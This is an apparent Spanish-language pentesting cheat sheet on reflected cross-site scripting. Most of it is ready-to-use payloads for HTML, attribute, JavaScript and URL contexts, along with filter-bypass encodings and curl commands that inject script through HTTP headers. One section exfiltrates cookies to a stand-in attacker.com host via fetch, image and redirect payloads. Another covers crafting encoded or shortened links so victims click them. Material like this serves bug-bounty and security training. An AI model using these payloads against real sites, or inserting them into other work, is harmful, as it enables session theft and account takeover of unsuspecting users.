---
icon: js
---

# Reflected XSS

El payload no se almacena en el servidor. El input malicioso viaja en la petición HTTP (URL, formulario) y se refleja inmediatamente en la respuesta. La víctima debe hacer clic en un enlace especialmente crafteado.

```
Atacante crafta URL → Víctima hace clic → Request llega al servidor
→ Servidor refleja el input en el HTML → Script ejecutado en el navegador de la víctima
```

### Ejemplo básico

```
URL normal:
https://target.com/search?q=zapatos

URL inyectada:
https://target.com/search?q=<script>alert(1)</script>

HTML resultante:
<p>Resultados para: <script>alert(1)</script></p>
```

### Payloads por contexto

#### Contexto HTML - entre tags

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
<iframe src="javascript:alert(1)">
<details open ontoggle=alert(1)>
<marquee onstart=alert(1)>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<input autofocus onfocus=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
```

#### Contexto de atributo - comillas dobles

```html
<!-- Cerrar atributo e inyectar event handler -->
" onmouseover="alert(1)
" onfocus="alert(1)" autofocus="
" onclick="alert(1)

<!-- Cerrar tag e inyectar nuevo elemento -->
"><script>alert(1)</script>
"><img src=x onerror=alert(1)>
"><svg onload=alert(1)>
```

#### Contexto de atributo - comillas simples

```html
' onmouseover='alert(1)
'><script>alert(1)</script>
'><img src=x onerror=alert(1)>
```

#### Contexto de atributo - sin comillas

```html
<!-- El valor termina en espacio -->
 onmouseover=alert(1)
 onfocus=alert(1) autofocus
```

#### Contexto JavaScript - dentro de `<script>`

```javascript
// Input reflejado dentro de un string JS
var x = "INPUT";

// Payloads para escapar del string
"-alert(1)-"
";alert(1)//
\";alert(1)//
</script><script>alert(1)</script>

// Input reflejado en contexto numérico
var x = INPUT;
// Payload:
1;alert(1)
1-alert(1)-1
```

#### Contexto de URL (href, src, action)

```html
<!-- href que acepta input directo -->
<a href="INPUT">

<!-- Payloads -->
javascript:alert(1)
javascript:alert(document.cookie)
JaVaScRiPt:alert(1)                 - bypass de filtros case-sensitive
&#106;avascript:alert(1)            - HTML entity bypass
data:text/html,<script>alert(1)</script>
```

#### Contexto dentro de un atributo src/href ya con javascript:

```html
<a href="javascript:INPUT">
<!-- Payload directo -->
alert(1)
alert(document.cookie)
```

### Vectores menos obvios

#### En cabeceras HTTP reflejadas

```bash
# User-Agent reflejado en la página
curl -H "User-Agent: <script>alert(1)</script>" https://target.com/

# Referer reflejado
curl -H "Referer: <script>alert(1)</script>" https://target.com/page

# X-Forwarded-For reflejado en logs/panel
curl -H "X-Forwarded-For: <script>alert(1)</script>" https://target.com/
```

#### En rutas de URL

```
https://target.com/user/<script>alert(1)</script>/profile
https://target.com/404/<script>alert(1)</script>
```

#### En parámetros de redirección

```
https://target.com/redirect?url=javascript:alert(1)
https://target.com/login?next=javascript:alert(1)
```

### Confirmar ejecución

```javascript
// Prueba básica
<script>alert(1)</script>

// Con dominio (bug bounty)
<script>alert(document.domain)</script>

// Sin alert (para evasión de filtros)
<script>confirm(1)</script>
<script>prompt(1)</script>
<script>console.log(1)</script>

// Visual sin JS
<h1>XSS</h1>
<b style=color:red>XSS</b>
```

### Robo de cookie con Reflected XSS

```javascript
// Exfiltrar cookie al servidor del atacante
<script>document.location='https://attacker.com/steal?c='+document.cookie</script>

// Con fetch (más silencioso, no redirige)
<script>fetch('https://attacker.com/steal?c='+encodeURIComponent(document.cookie))</script>

// Con imagen (más compatible)
<script>new Image().src='https://attacker.com/steal?c='+document.cookie</script>

// Versión compacta como parámetro en URL
https://target.com/search?q=<script>new Image().src='https://attacker.com/?c='+document.cookie</script>
```

### Metodología

```
1. Encontrar parámetros reflejados
   → Buscar en respuesta el valor enviado

2. Identificar contexto de reflexión
   → Entre tags HTML / en atributo / en JS / en URL

3. Adaptar payload al contexto
   → Ver tabla de payloads por contexto

4. Confirmar ejecución
   → alert(1) / alert(document.domain)

5. Escalar a payload útil
   → Robo de cookie, token, keylogger...

6. Preparar enlace para la víctima
   → URL encode si es necesario para que funcione
```

### Preparar la URL para la víctima

```bash
# URL sin encoding (puede no funcionar en algunos navegadores)
https://target.com/search?q=<script>alert(1)</script>

# URL encoded (más fiable)
https://target.com/search?q=%3Cscript%3Ealert(1)%3C/script%3E

# Double encoded (bypass de filtros que decodifican una vez)
https://target.com/search?q=%253Cscript%253Ealert(1)%253C/script%253E

# Acortadores de URL para ofuscar
→ bit.ly, tinyurl, etc. en contexto de ingeniería social
```

> Si `<script>` está bloqueado, casi siempre funciona `<img src=x onerror=...>` o `<svg onload=...>` ya que son event handlers, no tags de script.

> Herramientas como Burp Scanner o Dalfox detectan reflected XSS automáticamente y el contexto exacto de la inyección.

> Reflected XSS requiere engañar a la víctima para que haga clic. En bug bounty, esto se considera impacto real siempre que el dominio sea el correcto.
